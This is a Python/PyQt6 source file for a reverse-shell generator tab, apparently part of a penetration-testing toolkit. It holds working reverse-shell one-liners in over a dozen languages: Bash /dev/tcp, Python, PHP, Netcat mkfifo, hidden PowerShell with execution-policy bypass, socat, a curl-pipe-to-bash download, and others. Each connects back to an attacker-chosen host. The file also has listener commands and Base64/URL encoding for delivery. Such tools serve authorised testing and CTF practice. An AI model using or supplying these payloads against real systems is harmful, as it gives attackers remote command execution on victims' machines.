"""
Reverse Shell Generator tab.
"""

from __future__ import annotations

import base64
import urllib.parse
from typing import Optional

from PyQt6.QtWidgets import (
    QApplication,
    QComboBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPlainTextEdit,
    QPushButton,
    QVBoxLayout,
    QWidget,
    QCheckBox,
    QFrame,
)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QFont

# ── Shell templates ─────────────────────────────────────────────────────────
# {ip} and {port} are substituted at generation time.

_SHELLS: dict[str, dict[str, str]] = {
    "Bash": {
        "TCP":  "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "UDP":  "bash -i >& /dev/udp/{ip}/{port} 0>&1",
        "196":  "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
        "Read": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
    },
    "Python 3": {
        "Standard": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "PTY": (
            "python3 -c 'import socket,subprocess,os,pty;"
            "s=socket.socket();s.connect((\"{ip}\",{port}));"
            "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            "pty.spawn(\"/bin/bash\")'"
        ),
    },
    "Python 2": {
        "Standard": (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "p=subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
    },
    "PHP": {
        "exec":        "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "shell_exec":  "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "system":      "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "popen":       "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"/bin/sh -i <&3 >&3 2>&3\",\"r\");'",
        "proc_open": (
            "php -r '$sock=fsockopen(\"{ip}\",{port});"
            "$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
        ),
    },
    "Netcat": {
        "nc -e":       "nc -e /bin/sh {ip} {port}",
        "nc -c":       "nc -c sh {ip} {port}",
        "nc mkfifo":   "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "nc OpenBSD":  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
    },
    "PowerShell": {
        "Standard": (
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            "New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});"
            "$stream=$client.GetStream();"
            "[byte[]]$bytes=0..65535|%{{0}};"
            "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
            "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback=(iex $data 2>&1|Out-String);"
            "$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";"
            "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};"
            "$client.Close()"
        ),
        "One-liner": (
            "$client=New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});"
            "$stream=$client.GetStream();"
            "[byte[]]$bytes=0..65535|%{{0}};"
            "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{"
            "$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sb=(iex $data 2>&1|Out-String);"
            "$sb+=\"PS \"+(pwd).Path+\"> \";"
            "$rb=([text.encoding]::ASCII).GetBytes($sb);"
            "$stream.Write($rb,0,$rb.Length);$stream.Flush()}};"
            "$client.Close()"
        ),
    },
    "Perl": {
        "Standard": (
            "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
        ),
    },
    "Ruby": {
        "Standard": (
            "ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
            "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
    },
    "Socat": {
        "Standard":  "socat TCP:{ip}:{port} EXEC:/bin/sh",
        "PTY":       "socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
        "Encrypted": "socat OPENSSL:{ip}:{port},verify=0 EXEC:/bin/bash",
    },
    "Java": {
        "Runtime": (
            "Runtime r=Runtime.getRuntime();"
            "Process p=r.exec(new String[]{{\"bash\",\"-c\","
            "\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"}});"
            "p.waitFor();"
        ),
    },
    "Go": {
        "Standard": (
            "package main;import(\"net\";\"os/exec\";\"time\");"
            "func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");"
            "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;"
            "cmd.Stderr=c;cmd.Run();time.Sleep(time.Second)}}"
        ),
    },
    "Awk": {
        "Standard": (
            "awk 'BEGIN {{s=\"/inet/tcp/0/{ip}/{port}\";"
            "while(42){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline)>0) print |& s;close(c)}}}} while(c!=\"exit\") close(s)}}}}'  /dev/stdin"
        ),
    },
    "Lua": {
        "Standard": (
            "lua -e \"require('socket');require('os');"
            "t=socket.tcp();t:connect('{ip}','{port}');"
            "os.execute('/bin/sh -i <&3 >&3 2>&3')\""
        ),
    },
    "Telnet": {
        "Standard": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF",
    },
    "Curl": {
        "bash pipe": "curl http://{ip}:{port}/shell.sh|bash",
    },
}

# listener starters
_LISTENERS = {
    "nc":          "nc -lvnp {port}",
    "nc (verbose)":"nc -lvvnp {port}",
    "socat":       "socat -d -d TCP-LISTEN:{port},reuseaddr,fork STDOUT",
    "socat PTY":   "socat -d -d TCP-LISTEN:{port},reuseaddr EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
    "pwncat":      "pwncat-cs -lp {port}",
    "ncat":        "ncat -lvnp {port} --allow {ip}",
}

# ── Styles ──────────────────────────────────────────────────────────────────

_SS_LABEL = "color: #a6adc8; font-size: 11px; font-weight: bold;"
_SS_INPUT = (
    "QLineEdit { background: #181825; color: #cdd6f4; border: 1px solid #313244; "
    "border-radius: 4px; padding: 5px 8px; }"
    "QLineEdit:focus { border-color: #89b4fa; }"
)
_SS_COMBO = (
    "QComboBox { background: #181825; color: #cdd6f4; border: 1px solid #313244; "
    "border-radius: 4px; padding: 4px 8px; }"
    "QComboBox::drop-down { border: none; } "
    "QComboBox QAbstractItemView { background: #181825; color: #cdd6f4; "
    "selection-background-color: #313244; }"
)
_SS_OUTPUT = (
    "QPlainTextEdit { background: #0d1117; color: #4ec9b0; "
    "font-family: 'Fira Code', 'JetBrains Mono', 'Courier New', monospace; "
    "font-size: 12px; border: 1px solid #313244; border-radius: 4px; padding: 8px; }"
)
_SS_BTN = (
    "QPushButton { background: #313244; color: #cdd6f4; border: none; "
    "border-radius: 4px; padding: 5px 14px; }"
    "QPushButton:hover { background: #45475a; }"
    "QPushButton:pressed { background: #89b4fa; color: #1e1e2e; }"
)
_SS_BTN_ACCENT = (
    "QPushButton { background: #89b4fa; color: #1e1e2e; font-weight: bold; "
    "border: none; border-radius: 4px; padding: 5px 14px; }"
    "QPushButton:hover { background: #b4befe; }"
)
_SS_DIVIDER = "background: #313244;"


def _lbl(text: str) -> QLabel:
    l = QLabel(text)
    l.setStyleSheet(_SS_LABEL)
    return l


def _div() -> QFrame:
    f = QFrame()
    f.setFrameShape(QFrame.Shape.HLine)
    f.setFixedHeight(1)
    f.setStyleSheet(_SS_DIVIDER)
    return f


# ── Main Widget ─────────────────────────────────────────────────────────────

class RevShellTab(QWidget):
    def __init__(self, parent: Optional[QWidget] = None):
        super().__init__(parent)
        root = QVBoxLayout(self)
        root.setContentsMargins(16, 16, 16, 12)
        root.setSpacing(10)

        # ── Connection params ──────────────────────────────────────────
        params_row = QHBoxLayout()
        params_row.setSpacing(12)

        ip_col = QVBoxLayout()
        ip_col.addWidget(_lbl("LHOST (Your IP)"))
        self._ip = QLineEdit("10.10.14.1")
        self._ip.setStyleSheet(_SS_INPUT)
        self._ip.textChanged.connect(self._generate)
        ip_col.addWidget(self._ip)
        params_row.addLayout(ip_col, 3)

        port_col = QVBoxLayout()
        port_col.addWidget(_lbl("LPORT"))
        self._port = QLineEdit("4444")
        self._port.setStyleSheet(_SS_INPUT)
        self._port.textChanged.connect(self._generate)
        port_col.addWidget(self._port)
        params_row.addLayout(port_col, 1)

        root.addLayout(params_row)

        # ── Shell picker ───────────────────────────────────────────────
        picker_row = QHBoxLayout()
        picker_row.setSpacing(12)

        lang_col = QVBoxLayout()
        lang_col.addWidget(_lbl("LANGUAGE"))
        self._lang = QComboBox()
        self._lang.setStyleSheet(_SS_COMBO)
        self._lang.addItems(sorted(_SHELLS.keys()))
        self._lang.currentTextChanged.connect(self._on_lang_changed)
        lang_col.addWidget(self._lang)
        picker_row.addLayout(lang_col, 2)

        var_col = QVBoxLayout()
        var_col.addWidget(_lbl("VARIANT"))
        self._variant = QComboBox()
        self._variant.setStyleSheet(_SS_COMBO)
        self._variant.currentTextChanged.connect(self._generate)
        var_col.addWidget(self._variant)
        picker_row.addLayout(var_col, 2)

        root.addLayout(picker_row)

        # ── Options ────────────────────────────────────────────────────
        opts_row = QHBoxLayout()
        self._urlencode = QCheckBox("URL-encode")
        self._urlencode.setStyleSheet("color: #cdd6f4;")
        self._urlencode.stateChanged.connect(self._generate)
        self._b64 = QCheckBox("Base64-encode")
        self._b64.setStyleSheet("color: #cdd6f4;")
        self._b64.stateChanged.connect(self._generate)
        opts_row.addWidget(self._urlencode)
        opts_row.addWidget(self._b64)
        opts_row.addStretch()
        root.addLayout(opts_row)

        root.addWidget(_div())

        # ── Output ─────────────────────────────────────────────────────
        root.addWidget(_lbl("SHELL COMMAND"))
        self._out = QPlainTextEdit()
        self._out.setReadOnly(True)
        self._out.setStyleSheet(_SS_OUTPUT)
        self._out.setMinimumHeight(90)
        self._out.setMaximumHeight(140)
        root.addWidget(self._out)

        btn_row = QHBoxLayout()
        copy_btn = QPushButton("Copy Shell")
        copy_btn.setStyleSheet(_SS_BTN_ACCENT)
        copy_btn.clicked.connect(self._copy_shell)
        btn_row.addWidget(copy_btn)
        btn_row.addStretch()
        root.addLayout(btn_row)

        root.addWidget(_div())

        # ── Listener ───────────────────────────────────────────────────
        root.addWidget(_lbl("LISTENER COMMAND"))
        listen_row = QHBoxLayout()
        self._listener_pick = QComboBox()
        self._listener_pick.setStyleSheet(_SS_COMBO)
        self._listener_pick.addItems(_LISTENERS.keys())
        self._listener_pick.currentTextChanged.connect(self._generate_listener)
        listen_row.addWidget(self._listener_pick)
        listen_row.addStretch()
        root.addLayout(listen_row)

        self._listener_out = QPlainTextEdit()
        self._listener_out.setReadOnly(True)
        self._listener_out.setStyleSheet(_SS_OUTPUT)
        self._listener_out.setMaximumHeight(60)
        root.addWidget(self._listener_out)

        copy_listen_btn = QPushButton("Copy Listener")
        copy_listen_btn.setStyleSheet(_SS_BTN)
        copy_listen_btn.clicked.connect(self._copy_listener)
        root.addWidget(copy_listen_btn, alignment=Qt.AlignmentFlag.AlignLeft)

        root.addStretch()

        # Initial populate
        self._on_lang_changed(self._lang.currentText())

    # ── Helpers ────────────────────────────────────────────────────────

    def _on_lang_changed(self, lang: str):
        self._variant.blockSignals(True)
        self._variant.clear()
        variants = list(_SHELLS.get(lang, {}).keys())
        self._variant.addItems(variants)
        self._variant.blockSignals(False)
        self._generate()

    def _generate(self):
        lang = self._lang.currentText()
        variant = self._variant.currentText()
        ip = self._ip.text().strip() or "LHOST"
        port = self._port.text().strip() or "LPORT"

        template = _SHELLS.get(lang, {}).get(variant, "")
        cmd = template.format(ip=ip, port=port)

        if self._b64.isChecked():
            cmd = base64.b64encode(cmd.encode()).decode()
        elif self._urlencode.isChecked():
            cmd = urllib.parse.quote(cmd)

        self._out.setPlainText(cmd)
        self._generate_listener()

    def _generate_listener(self):
        key = self._listener_pick.currentText()
        template = _LISTENERS.get(key, "")
        ip = self._ip.text().strip() or "LHOST"
        port = self._port.text().strip() or "LPORT"
        self._listener_out.setPlainText(template.format(ip=ip, port=port))

    def _copy_shell(self):
        cb = QApplication.clipboard()
        if cb:
            cb.setText(self._out.toPlainText())

    def _copy_listener(self):
        cb = QApplication.clipboard()
        if cb:
            cb.setText(self._listener_out.toPlainText())
